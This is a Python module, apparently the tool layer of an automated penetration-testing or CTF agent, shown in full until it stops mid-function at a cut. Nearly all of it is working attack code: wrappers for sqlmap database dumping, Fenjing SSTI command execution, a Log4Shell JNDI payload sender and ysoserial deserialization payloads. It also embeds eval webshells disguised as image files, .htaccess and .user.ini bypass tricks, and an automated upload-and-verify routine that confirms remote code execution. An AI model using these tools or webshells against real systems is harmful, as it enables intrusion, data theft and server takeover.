import subprocess
import os
import sys
import asyncio
import json
import base64
import socket
import logging
from typing import Dict, Any, List

logger = logging.getLogger(__name__)


class SQLMapTool:
    def __init__(self):
        self.sqlmap_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "thirdparty",
            "sqlmap"
        )
        self.sqlmap_py = os.path.join(self.sqlmap_dir, "sqlmap.py")

    def is_available(self) -> bool:
        return os.path.exists(self.sqlmap_py)

    async def scan(self, url: str, options: str = "") -> Dict[str, Any]:
        if not self.is_available():
            return {"success": False, "error": "sqlmap不可用，请查看tools_install.md"}
        
        cmd = f"python3 {self.sqlmap_py} -u {url} {options} --batch --timeout=30"
        
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            
            result = stdout.decode("utf-8", errors="replace")
            if stderr:
                result += "\nSTDERR: " + stderr.decode("utf-8", errors="replace")
            
            if len(result) > 5000:
                result = result[:5000] + "\n\n[TRUNCATED] 输出过长，已截断"
            
            return {"success": True, "output": result}
        except asyncio.TimeoutError:
            return {"success": False, "error": "sqlmap扫描超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def detect(self, url: str) -> Dict[str, Any]:
        return await self.scan(url, "--dbs")

    async def get_databases(self, url: str) -> Dict[str, Any]:
        return await self.scan(url, "--dbs")

    async def get_tables(self, url: str, db: str) -> Dict[str, Any]:
        return await self.scan(url, f"-D {db} --tables")

    async def dump_table(self, url: str, db: str, table: str) -> Dict[str, Any]:
        return await self.scan(url, f"-D {db} -T {table} --dump")


class FenjingTool:
    """Fenjing SSTI 绕过WAF自动化扫描/攻击工具

    CLI 命令格式(基于 fenjing 源码 cli.py):
    - 扫描(auto-discovery): python3 -m fenjing scan --url URL [options]
    - 指定参数攻击:        python3 -m fenjing crack --url URL --inputs p1,p2 [options]
    - 路径攻击:             python3 -m fenjing crack_path --url URL [options]

    常用选项:
    --url / -u:        目标URL (必填)
    --method / -m:     HTTP方法 (默认POST)
    --inputs / -i:     参数名,逗号分隔 (crack命令必填)
    --header:           自定义Header (可多次, 格式"Key: value")
    --cookies:          Cookie字符串
    --extra-params:     额外GET参数 (如a=1&b=2)
    --extra-data:       额外POST参数
    --detect-mode:      accurate(默认) / fast
    --exec-cmd / -e:    攻击成功后执行的命令
    --environment:      flask / jinja2(默认)
    --interval:         请求间隔
    --proxy:            代理
    --no-verify-ssl:    跳过SSL验证
    --find-flag:        auto(默认) / enabled / disabled
    """

    MAX_RETRIES = 2
    RETRY_DELAY = 1.0  # seconds

    def __init__(self):
        self.fenjing_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "thirdparty",
            "Fenjing"
        )

    def is_available(self) -> bool:
        return os.path.exists(self.fenjing_dir)

    @staticmethod
    def _build_common_args(url: str, method: str = "POST",
                            headers: str = "", cookies: str = "",
                            extra_params: str = "", extra_data: str = "",
                            detect_mode: str = "accurate",
                            environment: str = "jinja2",
                            interval: float = 0.0,
                            no_verify_ssl: bool = False,
                            proxy: str = "",
                            include_method: bool = True) -> str:
        """构建fenjing HTTP相关的公共参数串

        Args:
            include_method: 是否包含--method参数。scan命令不支持该参数,
                            只有crack/crack_path等命令需要。
        """
        parts = [f'--url "{url}"']
        if include_method:
            parts.append(f"--method {method}")
        if headers:
            for h in headers.split("||"):
                h = h.strip()
                if h:
                    parts.append(f'--header "{h}"')
        if cookies:
            parts.append(f'--cookies "{cookies}"')
        if extra_params:
            parts.append(f'--extra-params "{extra_params}"')
        if extra_data:
            parts.append(f'--extra-data "{extra_data}"')
        parts.append(f"--detect-mode {detect_mode}")
        parts.append(f"--environment {environment}")
        if interval:
            parts.append(f"--interval {interval}")
        if proxy:
            parts.append(f'--proxy "{proxy}"')
        if no_verify_ssl:
            parts.append("--no-verify-ssl")
        return " ".join(parts)

    async def _run_fenjing(self, args: str, timeout: int,
                            retry_on_error: bool = True) -> Dict[str, Any]:
        """执行fenjing命令，支持重试"""
        cmd = f"cd {self.fenjing_dir} && python3 -m fenjing {args}"
        last_error = None

        for attempt in range(1 + self.MAX_RETRIES if retry_on_error else 1):
            process = None
            try:
                if attempt > 0:
                    logger.info(f"fenjing 重试第 {attempt} 次...")
                    await asyncio.sleep(self.RETRY_DELAY * attempt)

                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                try:
                    stdout, stderr = await asyncio.wait_for(
                        process.communicate(), timeout=timeout
                    )
                except asyncio.TimeoutError:
                    process.kill()
                    try:
                        await process.wait()
                    except Exception:
                        pass
                    raise

                result = stdout.decode("utf-8", errors="replace")
                if stderr:
                    err_text = stderr.decode("utf-8", errors="replace")
                    if err_text.strip():
                        result += "\nSTDERR: " + err_text

                if len(result) > 5000:
                    result = result[:5000] + "\n\n[TRUNCATED] 输出过长，已截断"

                # 检查是否有网络错误需要重试
                if retry_on_error and attempt < self.MAX_RETRIES:
                    error_indicators = [
                        "connection reset", "connection refused",
                        "timeout", "timed out", "reset by peer",
                        "connection aborted", "max retries exceeded",
                        "temporarily unavailable",
                    ]
                    if any(ind in result.lower() for ind in error_indicators):
                        last_error = "网络连接异常，将重试"
                        continue

                return {"success": True, "output": result}

            except asyncio.TimeoutError:
                last_error = f"fenjing执行超时({timeout}s)"
                if attempt < self.MAX_RETRIES:
                    continue
                return {"success": False, "error": last_error}
            except Exception as e:
                last_error = str(e)
                if attempt < self.MAX_RETRIES:
                    continue
                return {"success": False, "error": last_error}
            finally:
                if process is not None and process.returncode is None:
                    try:
                        process.kill()
                    except Exception:
                        pass

        return {"success": False, "error": last_error or "fenjing执行失败"}

    async def scan(self, url: str, method: str = "POST",
                    inputs: str = "", headers: str = "",
                    cookies: str = "", extra_params: str = "",
                    extra_data: str = "", detect_mode: str = "accurate",
                    environment: str = "jinja2",
                    exec_cmd: str = "",
                    no_verify_ssl: bool = False,
                    proxy: str = "") -> Dict[str, Any]:
        """扫描/攻击SSTI目标

        Args:
            url: 目标URL (如 http://target:5000/secret?secret={{payload}})
            method: HTTP方法 (GET/POST, 默认POST)
            inputs: 参数名逗号分隔 (如 "secret,name"。为空时用scan自动发现,不为空时用crack)
            headers: 自定义Header, 用||分隔多条 (如 "Cookie: session=xxx||User-Agent: test")
            cookies: Cookie字符串
            extra_params: 额外GET参数 (如 "a=1&b=2")
            extra_data: 额外POST参数
            detect_mode: accurate(精确,默认) / fast(快速)
            environment: flask / jinja2(默认)
            exec_cmd: 攻击成功后执行的命令 (如 "cat /flag")
            no_verify_ssl: 跳过SSL验证
            proxy: 代理地址
        """
        if not self.is_available():
            return {"success": False, "error": "fenjing不可用，请查看tools_install.md"}

        if inputs:
            # crack命令: 指定参数名进行攻击 (支持--method)
            common_args = self._build_common_args(
                url, method, headers, cookies, extra_params, extra_data,
                detect_mode, environment, no_verify_ssl=no_verify_ssl, proxy=proxy,
                include_method=True,
            )
            inputs_list = ",".join(p.strip() for p in inputs.split(","))
            subcmd = f"crack {common_args} --inputs {inputs_list}"
        else:
            # scan命令: 自动发现注入点 (不支持--method)
            common_args = self._build_common_args(
                url, method, headers, cookies, extra_params, extra_data,
                detect_mode, environment, no_verify_ssl=no_verify_ssl, proxy=proxy,
                include_method=False,
            )
            subcmd = f"scan {common_args}"

        if exec_cmd:
            subcmd += f' --exec-cmd "{exec_cmd}"'

        return await self._run_fenjing(subcmd, timeout=90)

    async def attack(self, url: str, method: str = "POST",
                     inputs: str = "", exec_cmd: str = "cat /flag",
                     headers: str = "", cookies: str = "",
                     detect_mode: str = "accurate",
                     environment: str = "jinja2",
                     no_verify_ssl: bool = False,
                     proxy: str = "") -> Dict[str, Any]:
        """SSTI攻击(带命令执行)

        与scan相同，但默认提供exec_cmd。若未指定inputs则先自动发现注入点再攻击。
        """
        return await self.scan(
            url=url, method=method, inputs=inputs,
            headers=headers, cookies=cookies,
            detect_mode=detect_mode, environment=environment,
            exec_cmd=exec_cmd, no_verify_ssl=no_verify_ssl, proxy=proxy,
        )


class Log4jTool:
    """Log4j漏洞检测工具，只做检测，不负责生成payload"""

    def __init__(self):
        pass

    async def scan(self, target: str, port: int = 4712, protocol: str = "tcp") -> Dict[str, Any]:
        """检测目标端口是否可能是log4j服务"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))

            # 发送探测数据，判断服务类型
            probes = [
                (b"\r\n", "空行探测"),
                (b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n", "HTTP探测"),
                (b"\x00\x00\x00\x00", "空字节探测"),
            ]

            results = []
            service_type = "unknown"

            for probe_data, probe_name in probes:
                try:
                    # 每次新建连接，避免状态污染
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    s.sendall(probe_data)
                    try:
                        data = s.recv(1024)
                        response = data.decode("utf-8", errors="ignore")[:200] if data else "无响应"
                        results.append({"probe": probe_name, "response": response})
                        # 如果响应包含Java特征，标记为可能的log4j服务
                        if any(kw in response.lower() for kw in ["java", "log4j", "serial"]):
                            service_type = "java-log4j"
                    except socket.timeout:
                        # Python 3.9: socket.timeout 不是 TimeoutError 的子类，必须单独捕获
                        results.append({"probe": probe_name, "response": "超时（端口开放但不响应）"})
                    except TimeoutError:
                        results.append({"probe": probe_name, "response": "超时（端口开放但不响应）"})
                    s.close()
                except Exception as e:
                    results.append({"probe": probe_name, "error": str(e)})

            sock.close()

            # 判断服务特征
            # 端口开放但所有探针均无响应（超时或无数据）→ silent 服务
            is_silent = all(
                r.get("response") in ("超时（端口开放但不响应）", "无响应")
                for r in results
            ) and len(results) > 0

            suggestion = ""
            if is_silent:
                suggestion = "端口开放但不响应任何探测，可能是Java反序列化服务（如log4j SocketServer CVE-2017-5645）。建议使用 ysoserial_generate 生成payload，再用 ysoserial_test 发送。"
            elif service_type == "java-log4j":
                suggestion = "检测到Java/log4j特征，可能是CVE-2021-44228(Log4Shell)。建议使用log4j_exploit发送JNDI payload。"

            return {
                "success": True,
                "target": target,
                "port": port,
                "protocol": protocol,
                "service_type": service_type,
                "is_silent": is_silent,
                "results": results,
                "suggestion": suggestion
            }
        except ConnectionRefusedError:
            return {"success": False, "error": "连接被拒绝"}
        except TimeoutError:
            return {"success": False, "error": "连接超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def exploit(self, target: str, port: int = 4712, protocol: str = "tcp", command: str = "id") -> Dict[str, Any]:
        """CVE-2021-44228 Log4Shell JNDI注入利用"""
        encoded_cmd = base64.b64encode(command.encode()).decode()
        payload = f"${{jndi:ldap://127.0.0.1:1389/Basic/Command/{encoded_cmd}}}"

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))

            sock.sendall((payload + "\r\n").encode())

            data = b""
            try:
                while True:
                    sock.settimeout(2)
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except TimeoutError:
                pass

            sock.close()

            return {
                "success": True,
                "target": target,
                "port": port,
                "command": command,
                "payload": payload[:100],
                "response": data.decode("utf-8", errors="ignore")[:1000] if data else "无响应"
            }
        except ConnectionRefusedError:
            return {"success": False, "error": "连接被拒绝"}
        except TimeoutError:
            return {"success": False, "error": "连接超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}


class YsoserialTool:
    def __init__(self):
        self.ysoserial_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "src",
            "thirdparty",
            "ysoserial",
            "ysoserial-all.jar"
        )

    def is_available(self) -> bool:
        return os.path.exists(self.ysoserial_path)

    async def generate_payload(self, gadget: str, command: str) -> Dict[str, Any]:
        if not self.is_available():
            return {"success": False, "error": "ysoserial不可用，请查看tools_install.md"}
        
        cmd = f"java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED -jar {self.ysoserial_path} {gadget} '{command}'"
        
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            async def communicate():
                return await process.communicate()
            
            stdout, stderr = await asyncio.wait_for(communicate(), timeout=30)
            
            payload = stdout
            stderr_str = stderr.decode("utf-8", errors="replace") if stderr else ""
            
            if stderr_str and "Exception" in stderr_str:
                return {"success": False, "error": stderr_str}
            
            if not payload or len(payload) < 100:
                # ysoserial正常输出至少几百字节的二进制数据
                # 空或过短说明生成失败（可能是Java版本不兼容或gadget不可用）
                error_info = f"payload为空或过短（{len(payload)}字节），可能是Java版本不兼容或gadget不可用。stderr: {stderr_str[:200]}"
                return {"success": False, "error": error_info}
            
            return {
                "success": True,
                "gadget": gadget,
                "command": command,
                "payload_length": len(payload),
                "payload_b64": base64.b64encode(payload).decode()
            }
        except asyncio.TimeoutError:
            return {"success": False, "error": "ysoserial生成payload超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def list_gadgets(self) -> Dict[str, Any]:
        if not self.is_available():
            return {"success": False, "error": "ysoserial不可用，请查看tools_install.md"}
        
        cmd = f"java -jar {self.ysoserial_path}"
        
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            async def communicate():
                return await process.communicate()
            
            stdout, stderr = await asyncio.wait_for(communicate(), timeout=10)
            
            gadgets = stderr.decode("utf-8", errors="replace") if stderr else stdout.decode("utf-8", errors="replace")
            return {"success": True, "gadgets": gadgets}
        except asyncio.TimeoutError:
            return {"success": False, "error": "ysoserial列出gadgets超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def test_payload(self, payload_b64: str, target: str, port: int = 4712) -> Dict[str, Any]:
        try:
            payload = base64.b64decode(payload_b64)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            
            sock.sendall(payload)
            
            data = b""
            try:
                while True:
                    sock.settimeout(2)
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except TimeoutError:
                pass
            
            sock.close()
            
            return {
                "success": True,
                "target": target,
                "port": port,
                "response": data.decode("utf-8", errors="ignore")[:1000] if data else "无响应"
            }
        except ConnectionRefusedError:
            return {"success": False, "error": "连接被拒绝"}
        except TimeoutError:
            return {"success": False, "error": "连接超时"}
        except Exception as e:
            return {"success": False, "error": str(e)}


ysoserial_tool = YsoserialTool()


async def ysoserial_generate(gadget: str, command: str) -> Dict[str, Any]:
    return await ysoserial_tool.generate_payload(gadget, command)


async def ysoserial_list() -> Dict[str, Any]:
    return await ysoserial_tool.list_gadgets()


async def ysoserial_test(payload_b64: str, target: str, port: int = 4712) -> Dict[str, Any]:
    return await ysoserial_tool.test_payload(payload_b64, target, port)


sqlmap_tool = SQLMapTool()
fenjing_tool = FenjingTool()
log4j_tool = Log4jTool()


async def sqlmap_scan(url: str, options: str = "") -> Dict[str, Any]:
    return await sqlmap_tool.scan(url, options)


async def sqlmap_detect(url: str) -> Dict[str, Any]:
    return await sqlmap_tool.detect(url)


async def sqlmap_get_databases(url: str) -> Dict[str, Any]:
    return await sqlmap_tool.get_databases(url)


async def sqlmap_get_tables(url: str, db: str) -> Dict[str, Any]:
    return await sqlmap_tool.get_tables(url, db)


async def sqlmap_dump_table(url: str, db: str, table: str) -> Dict[str, Any]:
    return await sqlmap_tool.dump_table(url, db, table)


async def fenjing_scan(url: str, method: str = "POST", inputs: str = "",
                        headers: str = "", cookies: str = "",
                        extra_params: str = "", extra_data: str = "",
                        detect_mode: str = "accurate",
                        environment: str = "jinja2",
                        exec_cmd: str = "",
                        no_verify_ssl: bool = False,
                        proxy: str = "") -> Dict[str, Any]:
    return await fenjing_tool.scan(
        url, method, inputs, headers, cookies,
        extra_params, extra_data, detect_mode, environment,
        exec_cmd, no_verify_ssl, proxy,
    )


async def fenjing_attack(url: str, method: str = "POST", inputs: str = "",
                         exec_cmd: str = "cat /flag",
                         headers: str = "", cookies: str = "",
                         detect_mode: str = "accurate",
                         environment: str = "jinja2",
                         no_verify_ssl: bool = False,
                         proxy: str = "") -> Dict[str, Any]:
    return await fenjing_tool.attack(
        url, method, inputs, exec_cmd, headers, cookies,
        detect_mode, environment, no_verify_ssl, proxy,
    )


async def log4j_scan(target: str, port: int = 4712, protocol: str = "tcp") -> Dict[str, Any]:
    return await log4j_tool.scan(target, port, protocol)


async def log4j_exploit(target: str, port: int = 4712, protocol: str = "tcp", command: str = "id") -> Dict[str, Any]:
    return await log4j_tool.exploit(target, port, protocol, command)


class FileUploadTool:
    """文件上传漏洞检测与利用工具

    内置经过验证的webshell模板，覆盖常见绕过场景。
    模板分类:
    - 基础PHP: php, phtml
    - 图片马: php_gif, php_jpg, php_png
    - 标签绕过: php_script, php_short_tag, php_gif_script, php_jpg_script
    - 信息泄露: php_info, php_env (disable_functions时使用)
    - 配置文件: htaccess_files_match, htaccess_addtype, user_ini
    """

    WEBSHELLS = {
        # === 基础PHP webshell ===
        "php": {
            "content": "<?php @eval($_POST['cmd']);?>",
            "filename": "shell.php",
            "content_type": "application/octet-stream",
        },
        "phtml": {
            "content": "<?php @eval($_POST['cmd']);?>",
            "filename": "shell.phtml",
            "content_type": "application/octet-stream",
        },
        # === 图片马（绕过内容检测） ===
        "php_gif": {
            "content": "GIF89a<?php @eval($_POST['cmd']);?>",
            "filename": "shell.gif",
            "content_type": "image/gif",
        },
        "php_jpg": {
            "content": "\xff\xd8\xff\xe0<?php @eval($_POST['cmd']);?>",
            "filename": "shell.jpg",
            "content_type": "image/jpeg",
        },
        "php_png": {
            "content": "\x89PNG\r\n\x1a\n<?php @eval($_POST['cmd']);?>",
            "filename": "shell.png",
            "content_type": "image/png",
        },
        # === 标签绕过（绕过 <? 检测） ===
        "php_script": {
            "content": "<script language=\"php\">@eval($_POST['cmd']);</script>",
            "filename": "shell.php",
            "content_type": "application/octet-stream",
        },
        "php_short_tag": {
            "content": "<?=@eval($_POST['cmd'])?>",
            "filename": "shell.php",
            "content_type": "application/octet-stream",
        },
        "php_gif_script": {
            "content": "GIF89a\n<script language=\"php\">@eval($_POST['cmd']);</script>",
            "filename": "shell.gif",
            "content_type": "image/gif",
        },
        "php_jpg_script": {
            "content": "\xff\xd8\xff\xe0\n<script language=\"php\">@eval($_POST['cmd']);</script>",
            "filename": "shell.jpg",
            "content_type": "image/jpeg",
        },
        # === 信息泄露（disable_functions时使用） ===
        "php_info": {
            "content": "<?php phpinfo();?>",
            "filename": "info.php",
            "content_type": "application/octet-stream",
        },
        "php_env": {
            "content": "<?php echo json_encode(['env'=>$_ENV,'server'=>$_SERVER,'getenv'=>getenv('FLAG'),'cookie'=>$_COOKIE]);?>",
            "filename": "env.php",
            "content_type": "application/octet-stream",
        },
        "php_gif_info": {
            "content": "GIF89a<?php phpinfo();?>",
            "filename": "info.gif",
            "content_type": "image/gif",
        },
        # === 配置文件（纯文本，不加图片头！MIME设为image/jpeg绕过前端校验） ===
        "htaccess_files_match": {
            "content": '<FilesMatch "\\.jpg$">\nSetHandler application/x-httpd-php\n</FilesMatch>',
            "filename": ".htaccess",
            "content_type": "image/jpeg",
        },
        "htaccess_addtype": {
            "content": "AddType application/x-httpd-php .jpg",
            "filename": ".htaccess",
            "content_type": "image/jpeg",
        },
        "user_ini": {
            "content": "auto_prepend_file=shell.jpg",
            "filename": ".user.ini",
            "content_type": "image/jpeg",
        },
        # === JSP/ASP ===
        "jsp": {
            "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
            "filename": "shell.jsp",
            "content_type": "application/octet-stream",
        },
        "asp": {
            "content": "<%eval request(\"cmd\")%>",
            "filename": "shell.asp",
            "content_type": "application/octet-stream",
        },
    }

    # 多策略绕过扩展名（按成功率排序）
    BYPASS_EXTENSIONS = [
        ".php", ".php5", ".php7", ".phtml", ".pht", ".phar",
        ".php.jpg", ".php.gif", ".php.png",
        ".PHP", ".Php", ".pHp5",
        ".phtml.jpg", ".pht.jpg",
    ]

    async def upload(self, url: str, filename: str = "", content: str = "",
                     field_name: str = "file", content_type: str = "",
                     extra_fields: str = "") -> Dict[str, Any]:
        """上传文件到目标URL"""
        import aiohttp
        from urllib.parse import urlparse

        try:
            form_data = aiohttp.FormData()

            if not content and not filename:
                return {"success": False, "error": "必须提供filename或content参数"}

            if extra_fields:
                import json as _json
                try:
                    extra = _json.loads(extra_fields)
                    for k, v in extra.items():
                        form_data.add_field(k, str(v))
                except _json.JSONDecodeError:
                    for pair in extra_fields.split("&"):
                        if "=" in pair:
                            k, v = pair.split("=", 1)
                            form_data.add_field(k, v)

            if not content_type:
                content_type = "application/octet-stream"

            form_data.add_field(
                field_name,
                content.encode() if isinstance(content, str) else content,
                filename=filename,
                content_type=content_type,
            )

            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.post(url, data=form_data) as response:
                    try:
                        resp_content = await response.text()
                    except UnicodeDecodeError:
                        raw = await response.read()
                        resp_content = f"<binary {len(raw)} bytes>"

                    return {
                        "success": True,
                        "status": response.status,
                        "headers": dict(response.headers),
                        "content": resp_content[:3000],
                        "url": str(response.url),
                        "uploaded_filename": filename,
                        "field_name": field_name,
                    }
        except asyncio.TimeoutError:
            return {"success": False, "error": "文件上传超时"}
        except aiohttp.ClientError as e:
            return {"success": False, "error": f"上传失败: {str(e) or type(e).__name__}"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def upload_webshell(self, url: str, shell_type: str = "php",
                              field_name: str = "file", extra_fields: str = "") -> Dict[str, Any]:
        """上传预置webshell"""
        shell_type = shell_type.lower().strip()
        if shell_type not in self.WEBSHELLS:
            available = ", ".join(self.WEBSHELLS.keys())
            return {"success": False, "error": f"不支持的shell类型: {shell_type}，可用: {available}"}

        shell = self.WEBSHELLS[shell_type]
        return await self.upload(
            url=url,
            filename=shell["filename"],
            content=shell["content"],
            field_name=field_name,
            content_type=shell["content_type"],
            extra_fields=extra_fields,
        )

    async def bypass_upload(self, url: str, field_name: str = "file",
                            extra_fields: str = "") -> Dict[str, Any]:
        """自动尝试多种绕过方式上传PHP webshell"""
        results = []
        for ext in self.BYPASS_EXTENSIONS:
            filename = f"shell{ext}"
            content = "<?php @eval($_POST['cmd']);?>"
            ct = "image/gif" if "gif" in ext else "application/octet-stream"

            result = await self.upload(
                url=url,
                filename=filename,
                content=content,
                field_name=field_name,
                content_type=ct,
                extra_fields=extra_fields,
            )
            results.append({
                "filename": filename,
                "status": result.get("status"),
                "success": result.get("success", False),
                "content_snippet": str(result.get("content", ""))[:200],
            })

        successful = [r for r in results if r["success"] and r["status"] in (200, 201)]
        return {
            "success": len(successful) > 0,
            "total_attempts": len(results),
            "successful_uploads": successful,
            "all_results": results,
        }

    async def auto_upload_and_verify(self, url: str, base_url: str = "",
                                     field_name: str = "file",
                                     extra_fields: str = "") -> Dict[str, Any]:
        """自动上传+验证：多策略轮询，主动验证命令执行是否成功

        核心改进: 不再仅检查"不含<?php原文"，而是上传带标记的测试shell，
        主动发POST请求验证命令执行回显，确认真正RCE。

        策略顺序（泛用设计）:
        1. .htaccess(AddType纯文本) + 图片马(script标签) → 验证RCE
        2. .htaccess(FilesMatch) + 图片马 → 验证RCE
        3. .user.ini + 图片马 → 验证RCE
        4. 直接上传各扩展名(.php/.phtml/.php5/.pht) → 逐个验证RCE
        5. 双扩展名(.php.jpg) Apache多后缀 → 验证RCE
        6. 图片马直接上传(.jpg含PHP代码) → 验证RCE
        7. phpinfo信息泄露（disable_functions时）
        """
        import aiohttp
        from urllib.parse import urlparse, urljoin

        if not base_url:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

        results = []
        timeout = aiohttp.ClientTimeout(total=10)
        VERIFY_MARKER = "PHP_RCE_VERIFY_OK"

        # 验证用测试shell（输出唯一标记，确认PHP解析+命令执行）
        VERIFY_SHELL_CONTENT = f"<?php echo '{VERIFY_MARKER}';?>"
        VERIFY_SHELL_SCRIPT = f"<script language=\"php\">echo '{VERIFY_MARKER}';</script>"

        async def verify_rce(shell_url: str, shell_type: str = "eval") -> dict:
            """主动验证RCE: 发送测试命令，检查回显

            shell_type: eval(POST cmd) / script(script标签) / direct(直接输出)
            """
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    if shell_type == "eval":
                        # POST cmd=echo标记，检查回显
                        async with session.post(shell_url, data={"cmd": f"echo {VERIFY_MARKER};"}) as resp:
                            body = await resp.text()
                            rce_ok = VERIFY_MARKER in body
                            return {
                                "accessible": resp.status == 200,
                                "status": resp.status,
                                "rce_verified": rce_ok,
                                "body_snippet": body[:300],
                                "verify_method": f"POST cmd=echo {VERIFY_MARKER}",
                            }
                    elif shell_type == "direct":
                        # 直接访问，检查输出标记
                        async with session.get(shell_url) as resp:
                            body = await resp.text()
                            rce_ok = VERIFY_MARKER in body
                            # 也检查是否PHP解析（不含原始PHP标签）
                            php_parsed = "<?php" not in body and "<script language" not in body
                            return {
                                "accessible": resp.status == 200,
                                "status": resp.status,
                                "rce_verified": rce_ok,
                                "php_parsed": php_parsed,
                                "body_snippet": body[:300],
                                "verify_method": "GET (检查输出标记)",
                            }
                    elif shell_type == "phpinfo":
                        # phpinfo页面，检查是否含phpinfo特征
                        async with session.get(shell_url) as resp:
                            body = await resp.text()
                            has_phpinfo = "phpinfo()" in body or "PHP Version" in body or "Configuration" in body
                            return {
                                "accessible": resp.status == 200,
                                "status": resp.status,
                                "rce_verified": has_phpinfo,
                                "body_snippet": body[:300],
                                "verify_method": "GET (检查phpinfo特征)",
                            }
            except Exception as e:
                return {"accessible": False, "error": str(e), "rce_verified": False}

        def extract_path(resp_content: str, filename: str) -> str:
            """从上传响应中提取文件可访问路径"""
            import re
            patterns = [
                rf'/[\w/\-]+/{re.escape(filename)}',
                rf'/[\w/\-]+/{re.escape(filename.split(".")[-2])}[\w.]*',
                rf'(/upload[s]?/[\w/\-.]+)',
                rf'(/files/[\w/\-.]+)',
                rf'(/static/[\w/\-.]+)',
                rf'(/var/www/html/[\w/\-.]+)',  # 服务器内部路径
            ]
            for pattern in patterns:
                match = re.search(pattern, resp_content)
                if match:
                    path = match.group(0)
                    # /var/www/html/ 是服务器内部路径，转为URL路径
                    if "/var/www/html/" in path:
                        path = path.replace("/var/www/html", "")
                    return path
            return f"/upload/{filename}"

        # === 策略1: .htaccess(AddType) + 图片马 ===
        for ht_type in ["htaccess_addtype", "htaccess_files_match"]:
            ht = self.WEBSHELLS[ht_type]
            await self.upload(url, ht["filename"], ht["content"],
                              field_name, ht["content_type"], extra_fields)
            # 上传验证用图片马（script标签绕过<?检测）
            shell = self.WEBSHELLS["php_jpg_script"]
            result_sh = await self.upload(url, shell["filename"], shell["content"],
                                          field_name, shell["content_type"], extra_fields)
            file_path = extract_path(result_sh.get("content", ""), shell["filename"])
            verify_url = urljoin(base_url, file_path)
            # 验证RCE
            verify = await verify_rce(verify_url, "eval")
            results.append({
                "strategy": f"1_{ht_type}",
                "htaccess_uploaded": True,
                "shell_filename": shell["filename"],
                "verify_url": verify_url,
                "verify": verify,
                "shell_url": verify_url if verify.get("rce_verified") else None,
            })
            if verify.get("rce_verified"):
                return {
                    "success": True,
                    "strategy_used": f"1_{ht_type}",
                    "shell_url": verify_url,
                    "shell_type": "php_jpg_script",
                    "verify_method": verify.get("verify_method"),
                    "all_results": results,
                    "suggestion": (
                        f"RCE验证成功! shell_url={verify_url}\n"
                        f"用http_post(url='{verify_url}', data='cmd=system(\"id\");')执行命令\n"
                        f"若命令无回显(disable_functions)，上传php_info模板查看phpinfo()"
                    ),
                }

        # === 策略2: .user.ini + 图片马 ===
        user_ini = self.WEBSHELLS["user_ini"]
        await self.upload(url, user_ini["filename"], user_ini["content"],
                          field_name, user_ini["content_type"], extra_fields)
        shell_gif = self.WEBSHELLS["php_gif_script"]
        result_sh = await self.upload(url, shell_gif["filename"], shell_gif["content"],
                                      field_name, shell_gif["content_type"], extra_fields)
        # .user.ini 通过auto_prepend_file在任何PHP页面触发
        for test_path in ["/index.php", "/", "/index.html"]:
            verify_url = urljoin(base_url, test_path)
            verify = await verify_rce(verify_url, "eval")
            if verify.get("rce_verified"):
                results.append({
                    "strategy": "2_user_ini",
                    "verify_url": verify_url,
                    "verify": verify,
                    "shell_url": verify_url,
                })
                return {
                    "success": True,
                    "strategy_used": "2_user_ini",
                    "shell_url": verify_url,
                    "shell_type": "php_gif_script",
                    "all_results": results,
                    "suggestion": f".user.ini RCE成功! 通过访问任意PHP页面触发。shell_url={verify_url}",
                }
        results.append({
            "strategy": "2_user_ini",
            "result": "failed",
            "note": ".user.ini需等待PHP缓存刷新(通常1分钟)，且仅PHP-FPM/FastCGI模式有效",
        })

        # === 策略3: 直接上传各扩展名 ===
        for ext, shell_key in [(".php", "php_script"), (".phtml", "php_script"),
                                (".php5", "php_script"), (".pht", "php_script"),
                                (".PHP", "php_script"), (".phar", "php_script")]:
            filename = f"shell{ext}"
            content = self.WEBSHELLS[shell_key]["content"]
            result = await self.upload(url, filename, content, field_name,
                                        "application/octet-stream", extra_fields)
            file_path = extract_path(result.get("content", ""), filename)
            verify_url = urljoin(base_url, file_path)
            verify = await verify_rce(verify_url, "eval")
            results.append({
                "strategy": f"3_ext_{ext}",
                "filename": filename,
                "upload_status": result.get("status"),
                "verify": verify,
                "shell_url": verify_url if verify.get("rce_verified") else None,
            })
            if verify.get("rce_verified"):
                return {
                    "success": True,
                    "strategy_used": f"3_ext_{ext}",
                    "shell_url": verify_url,
